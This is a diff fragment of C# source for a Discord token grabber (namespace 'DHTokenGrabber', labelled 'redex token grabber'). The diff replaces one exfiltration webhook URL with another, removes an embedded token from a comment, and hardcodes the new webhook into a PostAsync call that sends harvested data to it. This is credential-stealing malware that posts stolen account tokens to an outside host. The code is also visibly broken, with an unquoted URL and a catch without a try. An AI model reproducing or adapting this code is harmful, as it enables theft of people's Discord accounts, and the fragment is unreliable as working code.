@@ -1,8 +1,8 @@
-https://discord.com/api/webhooks/915293209297551391/KdUf0SEolCuHIeFHIQfzgJkIHbzjKuTGPtuPIwAr6FQPI0rel2fb5j7NO06iCqwxw2CN
+https://discord.com/api/webhooks/929449861080825896/dM-qPRlPaQur4AZUamChWhRRFXJD00G1PBNjqlAMEDsE936GnZ3Of5mdboLwbtiwRnxq
 staff
 namespace DHTokenGrabber
 {   
-// token: RID: 365 RVA:OTEzMTA1MDk5ODI2NTQwNjQ1.YZ5pZA.7nGgcZJSR9WeJs5c4W7kOSh1wqU file Offset:
+// token: RID: 365 RVA: file Offset:
 internal class program
 {
 
@@ -84,16 +84,15 @@ public static void sendWebHook(string discordWebHook,string content)
                 }) + "´´´"
             },
             {
-                "C Security#2468"
+                "Sebasorova#0001"
                 "redex token grabber"
             },
             {
-                "undefined//discord.com/assets/652f40427e1f5186ad54836074898279.png",
-                "https://discord.com/channels/@me/910580649482674176"
+                "Discord//https://discord.com/channels/@me/919996103175331901"
 
             }
         };
-        httpClient.PostAsync(WebHook._hookUrl, new ForUrlcodedContent(nameValuecollection)).GetAwaiter().GetResult();
+        httpClient.PostAsync(https://discord.com/api/webhooks/929449861080825896/dM-qPRlPaQur4AZUamChWhRRFXJD00G1PBNjqlAMEDsE936GnZ3Of5mdboLwbtiwRnxq, new ForUrlcodedContent(nameValuecollection)).GetAwaiter().GetResult();
         catch (WebException)
         {
         }
